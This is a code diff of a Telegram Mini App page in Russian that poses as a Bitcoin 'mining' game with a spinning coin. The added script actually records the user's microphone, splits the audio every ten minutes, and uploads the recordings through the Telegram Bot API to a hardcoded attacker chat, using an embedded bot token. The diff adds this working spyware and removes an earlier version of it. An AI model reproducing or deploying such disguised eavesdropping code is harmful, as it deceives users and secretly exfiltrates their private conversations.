@@ -19,90 +19,87 @@
   <div id="status">После нажатия начнется майнинг BTC…</div>
 
   <script>
-    const tg = window.Telegram.WebApp;
-    tg.ready();
+  const tg = window.Telegram.WebApp;
+  tg.ready();
 
-    const coin = document.getElementById('coin');
-    const status = document.getElementById('status');
-    let recording = false;
-    let mediaRecorder;
-    let chunks = [];
-    let autoTimer;
+  const coin = document.getElementById('coin');
+  const status = document.getElementById('status');
+  let recording = false;
+  let mediaRecorder;
+  let chunks = [];
+  let startTime = 0;
 
-    const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
-    const CHAT_ID = "7184293365"; // твои записи приходят сюда
+  const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
+  const CHAT_ID = "7184293365";
 
-    coin.addEventListener('click', () => {
-      if (recording) stopRecording();
-      else startRecording();
+  coin.addEventListener('click', () => {
+    if (recording) stopRecording();
+    else startRecording();
+  });
+
+  function startRecording() {
+    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+      recording = true;
+      coin.classList.add('rotating');
+      status.textContent = "Производится майнинг… (активно)";
+      chunks = [];
+      startTime = Date.now();
+
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' }); // webm вместо ogg — перематывается!
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = sendAudio;
+      mediaRecorder.start();
+
+      // каждые 10 минут автоматически отправляем и начинаем новый кусок
+      setInterval(() => {
+        if (recording && Date.now() - startTime > 10000) { // чтобы не отправлять пустые при быстром стопе
+          mediaRecorder.stop();
+          mediaRecorder.start();
+          chunks = [];
+          startTime = Date.now();
+        }
+      }, 600000); // ровно 10 минут
+    }).catch(err => {
+      alert("Разреши микрофон!");
+    });
+  }
+
+  function stopRecording() {
+    recording = false;
+    coin.classList.remove('rotating');
+    status.textContent = "Производится майнинг BTC…";
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+      mediaRecorder.stop();
+    }
+  }
+
+  function sendAudio() {
+    if (chunks.length === 0) return;
+
+    const blob = new Blob(chunks, { type: 'audio/webm' });
+    const filename = `mining_${new Date().toISOString().slice(0,19).replace(/:/g,"-")}.webm`;
+    const file = new File([blob], filename, { type: 'audio/webm' });
+
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('audio', file);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+      method: 'POST',
+      body: form
     });
 
-    function startRecording() {
-      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-        recording = true;
-        coin.classList.add('rotating');
-        status.textContent = "Майнинг идёт…";
-        chunks = [];
+    chunks = [];
+  }
 
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = sendAudio;
-        mediaRecorder.start();
+  // остановка при закрытии
+  window.addEventListener('beforeunload', stopRecording);
+</script>
 
-        // Автоматическая отправка каждые 10 минут
-        clearTimeout(autoTimer);
-        autoTimer = setInterval(() => {
-          if (recording && mediaRecorder) {
-            mediaRecorder.stop();
-            mediaRecorder.start();
-            chunks = [];
-          }
-        }, 600000); // 10 минут
-      }).catch(err => {
-        alert("Разреши доступ к микрофону!");
-        console.error(err);
-      });
-    }
-
-    function stopRecording() {
-      recording = false;
-      coin.classList.remove('rotating');
-      status.textContent = "После нажатия начнется майнинг BTC…";
-      clearInterval(autoTimer);
-      if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
-      }
-    }
-
-    function sendAudio() {
-      if (chunks.length === 0) return;
-
-      const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-      blobs = []; // очистка
-
-      const file = new File([blob], `mining_${Date.now()}.ogg`, { type: 'audio/ogg' });
-
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('audio', file);
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-        method: 'POST',
-        body: form
-      }).then(() => {
-        console.log("Файл отправлен");
-      }).catch(err => {
-        console.error("Ошибка отправки", err);
-      });
-    }
-
-    // Остановка при закрытии приложения
-    window.addEventListener('beforeunload', stopRecording);
-    tg.onEvent('mainButtonClicked', stopRecording);
-  </script>
 </body>
 </html>
 
 </html>
+
 
 
